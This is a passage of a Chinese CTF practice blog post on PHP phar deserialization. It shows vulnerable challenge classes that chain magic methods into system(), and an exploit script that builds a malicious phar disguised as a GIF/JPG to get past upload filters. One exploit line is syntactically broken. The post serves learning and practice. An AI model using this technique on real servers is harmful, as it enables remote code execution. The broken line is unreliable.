@@ -1,0 +1,787 @@
+  <!DOCTYPE html>
+  <html lang="en"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
+  <title>
+    web做题日记之phar反序列化喵 | Dawn
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish%3A400%2C400italic%2C700%2C700italic%7CNoto+Serif+SC%3A400%2C400italic%2C700%2C700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish%3A400%2C400italic%2C700%2C700italic%7CNoto+Serif+SC%3A400%2C400italic%2C700%2C700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="web做题日记之反序列化喵[TOC] 1.0喵喵喵1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?php&#x2F;** * 挑战目标：构造一个 POP 链，最终执行 system(&quot;whoami&quot;) * * 假设这是目标服务器上的源代码 (so">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web做题日记之phar反序列化喵">
+<meta property="og:url" content="http://example.com/2026/02/28/web%E5%81%9A%E9%A2%98%E6%97%A5%E8%AE%B0%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/index.html">
+<meta property="og:site_name" content="Dawn">
+<meta property="og:description" content="web做题日记之反序列化喵[TOC] 1.0喵喵喵1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?php&#x2F;** * 挑战目标：构造一个 POP 链，最终执行 system(&quot;whoami&quot;) * * 假设这是目标服务器上的源代码 (so">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2026/02/28/web%E5%81%9A%E9%A2%98%E6%97%A5%E8%AE%B0%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/1.png">
+<meta property="og:image" content="http://example.com/2026/02/28/web%E5%81%9A%E9%A2%98%E6%97%A5%E8%AE%B0%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/2.png">
+<meta property="og:image" content="http://example.com/2026/02/28/web%E5%81%9A%E9%A2%98%E6%97%A5%E8%AE%B0%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/3.png">
+<meta property="article:published_time" content="2026-02-28T12:40:21.000Z">
+<meta property="article:modified_time" content="2026-03-08T10:58:44.835Z">
+<meta property="article:author" content="Gloria">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="phar">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/02/28/web%E5%81%9A%E9%A2%98%E6%97%A5%E8%AE%B0%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/1.png">
+    <link rel="alternate" href="/atom.xml" title="Dawn" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+          <div class="main-nav-icon icon rotate">
+              &#xe62b;
+          </div>
+          <span class="main-nav-link">Home</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/archives">
+          <div class="main-nav-icon icon rotate">
+              &#xe62b;
+          </div>
+          <span class="main-nav-link">Archives</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/about">
+          <div class="main-nav-icon icon rotate">
+              &#xe62b;
+          </div>
+          <span class="main-nav-link">About</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/friend">
+          <div class="main-nav-icon icon rotate">
+              &#xe62b;
+          </div>
+          <span class="main-nav-link">Friend</span>
+        </span>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" aria-label="RSS Feed" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+    <picture></picture>
+    <img  fetchpriority="high" src="/images/22.jpg" alt="web做题日记之phar反序列化喵">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">web做题日记之phar反序列化喵</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content" class="sidebar-left"  >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E5%81%9A%E9%A2%98%E6%97%A5%E8%AE%B0%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5"><span class="toc-number">1.</span> <span class="toc-text">web做题日记之反序列化喵</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-0%E5%96%B5%E5%96%B5%E5%96%B5"><span class="toc-number">1.1.</span> <span class="toc-text">1.0喵喵喵</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-0%E5%96%B5%E5%96%B5%E5%96%B5%E5%96%B5"><span class="toc-number">1.2.</span> <span class="toc-text">2.0喵喵喵喵</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-0%E5%96%B5%E5%96%B5"><span class="toc-number">1.3.</span> <span class="toc-text">3.0喵喵</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-0-ctfshow-web259"><span class="toc-number">1.4.</span> <span class="toc-text">4.0 ctfshow-web259</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-0-cttfshow-web265"><span class="toc-number">1.5.</span> <span class="toc-text">5.0 cttfshow-web265</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-0-ctfshow-web266"><span class="toc-number">1.6.</span> <span class="toc-text">6.0 ctfshow-web266</span></a></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Gloria" class="lazyload">
+  <div class="sidebar-author-name">Gloria</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">15</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">11</div>
+  </div>
+</div>
+<div class="sidebar-social">
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+            &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+            &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+            &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-icon icon rotate">
+            &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-web做题日记之反序列化喵" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-02-28T12:40:21.000Z" itemprop="datePublished">2026-02-28</time>
+    <time style="display: none;" id="post-update-time">2026-03-08</time>
+  </span>
+</div>
+
+        <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%81%9A%E9%A2%98%E6%97%A5%E8%AE%B0/" title="做题日记">做题日记</a>
+  </div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h2 id="web做题日记之反序列化喵"><a href="#web做题日记之反序列化喵" class="headerlink" title="web做题日记之反序列化喵"></a>web做题日记之反序列化喵</h2><p>[TOC]</p>
+<h3 id="1-0喵喵喵"><a href="#1-0喵喵喵" class="headerlink" title="1.0喵喵喵"></a>1.0喵喵喵</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 挑战目标：构造一个 POP 链，最终执行 system(&quot;whoami&quot;)</span></span><br><span class="line"><span class="comment"> * * 假设这是目标服务器上的源代码 (source.php)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">var</span> = <span class="variable">$var</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提示：这是链条的起点吗？</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;清理 Modifier 对象...&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提示：当对象被当作字符串时触发</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发了 Show 类的 toString...&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;source-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;执行最终操作...&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 你的任务：</span></span><br><span class="line"><span class="comment"> * 在下方编写你的生成代码 (exp.php)，生成一个恶意 Phar 文件</span></span><br><span class="line"><span class="comment"> * * 思考逻辑：</span></span><br><span class="line"><span class="comment"> * 1. Modifier 销毁时会 echo $this-&gt;var;</span></span><br><span class="line"><span class="comment"> * 2. 如果 $this-&gt;var 是一个 Show 对象，echo 它会触发什么？</span></span><br><span class="line"><span class="comment"> * 3. Show 对象触发后会调用 $this-&gt;source-&gt;action();</span></span><br><span class="line"><span class="comment"> * 4. 如果 $this-&gt;source 是一个 Test 对象，会发生什么？</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>审计代码ing➡</strong></p>
+<p>三个类：Modifier、Show、Test</p>
+<p>因为要执行system(“whoami”) ，那么Test类肯定是<strong>链条终点</strong></p>
+<p>Modifier为<strong>链条起点</strong>（存在<code>__destruct()</code>函数，因为<code>__desatruct()</code>函数可以自动运行），存在一个变量var，存在<code>echo $this-&gt;var;</code></p>
+<p>Show类中的<code>__toString()</code>函数需要当Show类里的变量被打印的时候才会触发，触发后会调用<code>$this-&gt;source</code>里的<code>action()</code></p>
+<p>要从Modifier到Test，那么中间量就是Show，即show为跳板</p>
+<p><strong>思路➡</strong></p>
+<p>先把$var赋值为一个Show里的对象，运行结束之后<code>__desatruct()</code>触发<code>echo $this-&gt;var;</code>➡</p>
+<p>到Show类里去触发<code>$this-&gt;source-&gt;action()</code>➡</p>
+<p>再事先将Show类里的$source赋值为Test的对象➡</p>
+<p>最后转到Test运行<code>system($this-&gt;p);</code></p>
+<p><strong>代码如下：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 挑战目标：构造一个 POP 链，最终执行 system(&quot;whoami&quot;)</span></span><br><span class="line"><span class="comment"> * * 假设这是目标服务器上的源代码 (source.php)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">var</span> = <span class="variable">$var</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提示：这是链条的起点吗？</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;清理 Modifier 对象...&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提示：当对象被当作字符串时触发</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发了 Show 类的 toString...&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;source-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;执行最终操作...&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();<span class="comment">//创建一个Test类的对象test</span></span><br><span class="line"><span class="variable">$test</span>-&gt; = <span class="string">&quot;whoami&quot;</span>;<span class="comment">//执行sysytem(&#x27;whoami&#x27;);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$show</span>-&gt;source = <span class="variable">$test</span>;<span class="comment">//间接执行了test变量的action()</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$modifier</span> = <span class="keyword">new</span> <span class="title class_">Modifier</span>(<span class="variable">$show</span>);</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;exp.phar&quot;</span>);<span class="comment">//unlink：删除已有文件</span></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;exp.jpg&quot;</span>);<span class="comment">//@：没有文件就跳过，不需要报错</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;exp.phar&quot;</span>);<span class="comment">//创建一个phar文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetaData</span>(<span class="variable">$modifier</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&quot;exp.phar&quot;</span>,<span class="string">&quot;exp.jpg&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-0喵喵喵喵"><a href="#2-0喵喵喵喵" class="headerlink" title="2.0喵喵喵喵"></a>2.0喵喵喵喵</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 挑战 02：四阶链条突破</span></span><br><span class="line"><span class="comment"> * 目标：执行 system(&quot;whoami&quot;)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 目标代码 (source.php) ---</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EasyStart</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[1] 启动 EasyStart...&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a; <span class="comment">// 触发点：把 $a 当字符串打印</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MediumJump</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[2] 进入 MediumJump...&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">// 关键点：尝试访问 $b 里的 &#x27;secret&#x27; 属性</span></span><br><span class="line">        <span class="comment">// 如果 $b 对应的类里没有 &#x27;secret&#x27;，会发生什么？</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;b-&gt;secret; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HardGet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当访问不存在的属性时触发</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[3] 触发了 HardGet 的 __get，访问了：&quot;</span> . <span class="variable">$name</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;c-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sink</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[4] 最终终点站！执行命令...&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span 